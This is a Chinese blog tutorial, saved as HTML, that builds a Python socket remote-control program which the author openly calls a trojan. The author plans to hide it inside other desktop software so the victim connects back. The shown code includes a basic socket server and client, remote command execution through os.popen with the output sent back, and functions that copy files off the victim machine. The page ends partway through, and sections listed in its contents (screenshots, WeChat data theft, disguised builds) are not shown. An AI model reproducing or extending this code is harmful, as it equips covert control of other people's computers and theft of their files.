<!doctype html><html lang=zh-cn><head><script>(function(){const e=localStorage.getItem("theme")||"light";document.documentElement.setAttribute("data-theme",e)})()</script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=author content="LiuChao"><meta name=description content="一个由Python语言编写的基于Socket的远程控制程序"><link rel=icon href=https://blog.pi3.fun/favicon.ico><meta name=keywords content=" study  latex  life  academic "><meta property="og:url" content="https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/"><meta property="og:site_name" content="Pi3's Notes"><meta property="og:title" content="基于Socket的远程控制程序"><meta property="og:description" content="一个由Python语言编写的基于Socket的远程控制程序"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2023-11-29T00:00:00+00:00"><meta property="article:modified_time" content="2023-11-29T00:00:00+00:00"><meta property="article:tag" content="技术"><meta property="article:tag" content="Python"><meta property="article:tag" content="Socket"><link rel=canonical href=https://blog.pi3.fun/post/2023/11/%E5%9F%BA%E4%BA%8Esocket%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F/><meta itemprop=name content="基于Socket的远程控制程序"><meta itemprop=description content="一个由Python语言编写的基于Socket的远程控制程序"><meta itemprop=datePublished content="2023-11-29T00:00:00+00:00"><meta itemprop=dateModified content="2023-11-29T00:00:00+00:00"><meta itemprop=wordCount content="5259"><meta itemprop=keywords content="技术,Python,Socket"><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/common.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/content.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/theme.css><link media=screen rel=stylesheet href=https://blog.pi3.fun/css/iconfont/iconfont.css><link rel=stylesheet href=https://blog.pi3.fun/css/syntax/xcode.css data-theme-style=light media="(prefers-color-scheme: light)"><link rel=stylesheet href=https://blog.pi3.fun/css/syntax/catppuccin-mocha.css data-theme-style=dark media="not all"><title>基于Socket的远程控制程序 - Pi3's Notes</title>
<link rel=stylesheet href=https://blog.pi3.fun/css/single.css><link href=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/katex.min.css rel=stylesheet><script defer src=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/katex.min.js></script><script defer src=https://lf3-cdn-tos.bytecdntp.com/cdn/expire-100-y/KaTeX/0.15.2/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}],ignoredTags:["script","noscript","style","textarea","pre","code","option"],throwOnError:!1})})</script></head><body><div id=wrapper><header id=header><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Regular/result.css><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Italic/result.css><link rel=stylesheet href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css><h1><a href=https://blog.pi3.fun/>Pi3's Notes</a></h1><nav><span class=nav-bar-item><a class=link href=/>文章</a>
</span><span class=nav-bar-item><a class=link href=/post/>归档</a>
</span><span class=nav-bar-item><a class=link href=/about/>关于</a>
</span><span class=nav-bar-item><a class=link href=/links/>友链</a>
</span><span class=nav-bar-item><a class="link theme-toggle" href=javascript:void(0);>黑暗</a></span></nav></header><main id=main class=post><h1>基于Socket的远程控制程序</h1><div><b>Keywords: </b><a class=link href=https://blog.pi3.fun/tags/%E6%8A%80%E6%9C%AF>#技术</a>
<a class=link href=https://blog.pi3.fun/tags/python>#Python</a>
<a class=link href=https://blog.pi3.fun/tags/socket>#Socket</a></div><div><b>Release Date: </b><span>2023-11-29</span></div><details><summary><b>Table of Contents</b></summary><div class=toc><nav id=TableOfContents><ul><li><a href=#概述>概述</a></li><li><a href=#实现过程>实现过程</a><ul><li><a href=#最简单的socket程序>最简单的Socket程序</a></li><li><a href=#远程命令执行>远程命令执行</a></li><li><a href=#远程下载文件>远程下载文件</a></li><li><a href=#远程上传文件>远程上传文件</a></li><li><a href=#远程获取屏幕截图>远程获取屏幕截图</a></li><li><a href=#获取微信数据>获取微信数据</a></li></ul></li><li><a href=#木马程序>木马程序</a><ul><li><a href=#peppa-pig>peppa-pig</a></li><li><a href=#量子加密网盘客户端>量子加密网盘客户端</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></div></details><article class=content><blockquote><p>一个基于Python Socket 实现远程控制程序
可以用作远控木马</p></blockquote><h2 id=概述>概述</h2><p>实现的功能：</p><ul><li>远程命令执行</li><li>远程文件上传</li><li>远程文件下载</li><li>获取远程主机截屏</li></ul><p>在学习网络安全技术的过程中，了解到了计算机病毒、蠕虫和木马等知识，这其中木马应该是最好实现的一个，于是便想到写一个木马</p><p>在众多木马的类型中，结合学习到的网络编程知识，于是便有了这一个基于Socket实现的远程控制程序</p><p>在后续，可以将这个远控程序写入其他客户端程序中（比如之前的量子加密网盘项目），只要对方打开了桌面程序，就能远程连接</p><h2 id=实现过程>实现过程</h2><h3 id=最简单的socket程序>最简单的Socket程序</h3><p>首先，整个程序的框架就是基于Socket的TCP传输，先写一个最简单的Socket程序</p><p><strong>Server端：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socket_server</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>8888</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=p>,</span> <span class=n>address</span> <span class=o>=</span> <span class=n>socket_server</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;接收到客户端连接，来自</span><span class=si>{</span><span class=n>address</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>data</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;接收到发来的消息：&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reply</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;请输入回复的消息：&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>reply</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socket_server</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p><strong>Client端：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socker_client</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>socker_client</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;localhost&#39;</span><span class=p>,</span> <span class=mi>8888</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;连接到服务端&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>send_msg</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;请输入要发送的消息：&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>send_msg</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>send_msg</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>recv_data</span> <span class=o>=</span> <span class=n>socker_client</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;服务端回复的消息：&#39;</span><span class=p>,</span> <span class=n>recv_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>socker_client</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></div><p>以上是最简单的一个Socket程序，实现了两台主机之间相互传递文字信息。</p><p>但是在这个程序中，同样存在很多的问题，比如：</p><ol><li>传输的消息可能会超过1024</li><li>没有任何异常抛出机制，在Socket通信的过程中，一定会存在丢包、失去连接、超时等问题</li><li>…………</li></ol><p>这些问题如果只是在上面这样一个简单程序中，基本不会有问题，但是一旦程序实现的功能多了，代码量大了，这些问题都至关重要，都需要在后续的代码中注意，不然找bug会很痛苦😢</p><blockquote><p>需要强调的是，在此程序中，我将服务端作为主动执行端，客户端作为被动执行端，也就是服务端发送指令，客户端根据指令进行操作并返回服务端</p><p>对于木马程序，同样可以理解为，服务端为攻击操纵者，客户端为攻击受害者</p><p>后续的介绍中，都是以此为基础</p></blockquote><h3 id=远程命令执行>远程命令执行</h3><p>学会上面最简单的socket程序之后，接下来就是思考，怎么实现远程的命令执行</p><p>在这里我们可以使用Python中的os模块，os模块提供的就是各种 Python 程序与操作系统进行交互的接口。通过使用os模块，一方面可以方便地与操作系统进行交互，另一方面页可以极大增强代码的可移植性</p><p>Python中的os模块，理论上支持Windows、Linux和Mac OS系统，所以使用os模块，也可以增大我们编写的这个程序的使用范围</p><p>所以远程命令执行的整体流程和框架为：</p><p>{% mermaid %}</p><p>graph TB</p><p>a(服务端等待客户端连接)&ndash;>b(客户端连接上服务端)</p><p>b&ndash;>c(服务端接收到连接并发送指令)</p><p>c&ndash;>d(客户端解析指令并调用OS模块执行)</p><p>{% endmermaid %}</p><p>使用os模块进行命令也十分简单，只需要使用 <code>os.system('命令')</code> 或者 <code>os.popen('命令')</code> 就可以实现.</p><p>但是，这里不能使用<code>os.system</code>，比如我们执行<code>dir</code>命令，需要返回文件夹内的内容，<font color=#00b0f0>它不能返回命令执行后的内容</font>，而<code>os.popen</code>可以</p><blockquote><p>补充：</p><p>python中<code>os.system</code>、<code>os.popen</code>、<code>subprocess.popen</code>都是可以实现系统命令的执行
但是他们之间也存在区别，<a href=https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172>参考文章</a></p><p>总结一下：</p><ol><li><code>os.system</code>直接调用标准C的system() 函数，仅仅在一个子终端运行系统命令，而不能获取命令执行后的返回信息</li><li><code>os.popen</code>不仅执行命令而且返回执行后的信息对象(常用于需要获取执行命令后的返回信息)，是通过一个管道文件将结果返回。返回的是 file read 的对象，对其进行读取<code>read</code>的操作可以看到执行的输出</li><li><code>subprocess.popen</code>与<code>os.popen</code>类似，但是当执行命令的参数或者返回中包含了中文文字，更建议使用<code>subprocess</code></li><li><code>commands</code>可以获取返回值和命令的输出结果</li></ol></blockquote><p>所以在这个功能实现中，我选择使用 <code>os.popen</code> 方法来实现命令执行，使用 <code>read</code> 方法读取返回的内容</p><p><strong>Client端执行命令函数:</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_cmd</span><span class=p>(</span><span class=n>socker_client</span><span class=p>,</span> <span class=n>cmd</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getcwd</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;cd&#39;</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>()[</span><span class=mi>1</span><span class=p>])</span>  
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>chdir</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;目录不存在&#39;</span>  
</span></span><span class=line><span class=cl>            <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;切换目录成功&#39;</span>  
</span></span><span class=line><span class=cl>        <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 执行命令  </span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;命令执行失败：</span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s1>&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>result</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=s1>&#39;命令执行成功&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 把命令回显结果发送给服务端  </span>
</span></span><span class=line><span class=cl>    <span class=n>socker_client</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span></code></pre></div><p>从上面这个函数实现代码中可以看到，我特意对 <code>cd</code> 切换目录命令做了单独的判断</p><p>这是因为在Python程序中直接执行 <code>cd</code> 切换目录是不起作用的，还是会返回当前程序运行的目录位置，所以需要使用 <code>os.chdir</code> 方法对当前Python程序运行的目录进行切换</p><p>除此之外的其他命令则没有进行单独的判断，直接交给 <code>popen</code> 执行，并用 <code>read</code> 方法读取返回信息</p><blockquote><p>值得注意的是，<code>popen</code>在执行其他命令会有意想不到的返回值，可能会不返回值，并且一直阻塞，需要根据实际情况单独判断</p></blockquote><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214229.png alt=远程执行命令></p><h3 id=远程下载文件>远程下载文件</h3><p>远程下载文件，需要的是服务端和客户端紧密配合，并且保证通信过程中的同步</p><p>所谓同步，一定是<strong class=chinese>一收一发</strong>的形式，不论是客户端还是服务端，一旦有一端出现了连续两次的发送或者接收，在实际的执行过程中，一定会出现死锁的现象，也就是双方都在等待对方发送消息，双方一直阻塞。</p><p>远程下载文件的整体流程和框架：</p><p>{% mermaid %}</p><p>graph TB</p><p>a[服务端发送下载文件指令并指定文件名称]&ndash;>b[客户端接收下载文件指令]</p><p>b&ndash;>c[客户端搜索文件是否存在]</p><p>c&ndash;>|存在|d[客户端读取文件数据并发送头部信息]</p><p>c&ndash;>|不存在|e[客户端向服务端发送不存在指令]</p><p>d&ndash;>f[服务端接收头部信息发送确认信息]</p><p>e&ndash;>h[双方退出下载文件流程]</p><p>f&ndash;>f1[客户端接收确认信息并发送文件数据]</p><p>f1&ndash;>f2[服务端接收文件数据并写入本地文件]</p><p>{% endmermaid %}</p><p>这其中有一步是发送和确认文件的头部信息，这是为了告诉服务端所要接收的文件的文件大小和名称，以便写入文件。</p><p>当然这一步是可以省略的，服务端可以根据输入的指令信息得知文件的名称</p><p>在此程序中，使用 <code>get 文件名称</code> 的方式告诉双方，我需要进行下载文件的流程</p><p><strong>Server端get函数：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 文件不存在的情况  </span>
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;file_not_exist&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;文件不存在&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 接收文件头部大小  </span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_size</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=n>rev</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>error</span><span class=p>,</span> <span class=ne>ConnectionResetError</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;在接收文件头部长度时发生错误&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 发送确认消息  </span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size_ok&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 接收文件头部信息  </span>
</span></span><span class=line><span class=cl>    <span class=n>header_bytes</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>header_size</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>header</span><span class=p>[</span><span class=s1>&#39;file_name&#39;</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=n>file_size</span> <span class=o>=</span> <span class=n>header</span><span class=p>[</span><span class=s1>&#39;file_size&#39;</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=c1># 发送确认消息  </span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;header_ok&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;文件名称：</span><span class=si>{</span><span class=n>file_name</span><span class=si>}</span><span class=s1>，文件大小：</span><span class=si>{</span><span class=n>file_size</span><span class=si>}</span><span class=s1> B&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;开始接收文件...&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_name</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>file_size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=n>content</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>file_size</span> <span class=o>-=</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>IOError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;在写入文件时发生错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;接收文件完成&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Client端get函数：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>file_name</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isfile</span><span class=p>(</span><span class=n>file_name</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;file_exist&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>file_size</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>getsize</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header</span> <span class=o>=</span> <span class=p>{</span>  
</span></span><span class=line><span class=cl>            <span class=s1>&#39;file_name&#39;</span><span class=p>:</span> <span class=n>file_name</span><span class=p>,</span>  
</span></span><span class=line><span class=cl>            <span class=s1>&#39;file_size&#39;</span><span class=p>:</span> <span class=n>file_size</span>  
</span></span><span class=line><span class=cl>        <span class=p>}</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_json</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>header</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_bytes</span> <span class=o>=</span> <span class=n>header_json</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_size</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>header_size</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;size_ok&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;header_ok&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_name</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                    <span class=k>while</span> <span class=n>file_size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                        <span class=n>file_size</span> <span class=o>-=</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;发送错误: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;file_not_exist&#39;</span><span class=p>)</span>
